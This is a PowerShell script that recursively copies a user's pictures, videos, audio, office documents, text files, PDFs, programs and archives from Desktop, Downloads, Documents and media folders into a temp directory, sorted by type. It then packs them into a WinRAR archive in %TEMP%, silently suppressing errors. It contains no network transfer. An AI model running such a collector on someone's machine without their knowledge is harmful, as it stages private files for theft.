$D = "$env:TEMP\DataT"
$R = "$env:TEMP\DataT.rar"
Remove-Item $D,$R -Recurse -Force -ErrorAction SilentlyContinue
New-Item $D -ItemType Directory -Force | Out-Null

$Categories = @{
    Pictures  = @('.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.svg')
    Videos    = @('.mp4', '.mkv', '.mov', '.avi', '.wmv', '.webm')
    Audio     = @('.mp3', '.wav', '.flac', '.m4a', '.ogg')
    Documents = @('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx')
    Text      = @('.txt', '.csv', '.json', '.xml', '.log', '.md')
    PDF       = @('.pdf')
    Programs  = @('.exe', '.msi', '.bat', '.cmd', '.ps1', '.py', '.js')
    Archives  = @('.zip', '.rar', '.7z', '.tar', '.gz')
}

$Categories.Keys | ForEach-Object {
    New-Item "$D\$_" -ItemType Directory -Force | Out-Null
}

$Folders = @('Desktop', 'Downloads', 'Documents', 'Pictures', 'Videos', 'Music')
foreach ($Folder in $Folders) {
    $Source = "$env:USERPROFILE\$Folder"
    if (Test-Path $Source) {
        Get-ChildItem $Source -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $Extension = $_.Extension.ToLower()
            $Category = $null
            
            foreach ($Name in $Categories.Keys) {
                if ($Categories[$Name] -contains $Extension) {
                    $Category = $Name
                    break
                }
            }
            
            # If the file extension doesn't match any category, skip it entirely
            if (-not $Category) { return }

            $Destination = "$D\$Category\$($_.Name)"
            if (Test-Path $Destination) {
                $Base = [IO.Path]::GetFileNameWithoutExtension($_.Name)
                $Ext = [IO.Path]::GetExtension($_.Name)
                $Number = 1
                do {
                    $Destination = "$D\$Category\${Base}_$Number$Ext"
                    $Number++
                } while (Test-Path $Destination)
            }
            Copy-Item $_.FullName $Destination -Force -ErrorAction SilentlyContinue
        }
    }
}

$WinRAR = "${env:ProgramFiles}\WinRAR\WinRAR.exe"
if (-not (Test-Path $WinRAR)) { $WinRAR = "${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe" }
if (Test-Path $WinRAR) {
    & $WinRAR a -r -ep1 $R "$D\*" | Out-Null
    Remove-Item $D -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "Created: $R"
} else {
    Write-Host "WinRAR is not installed."
}
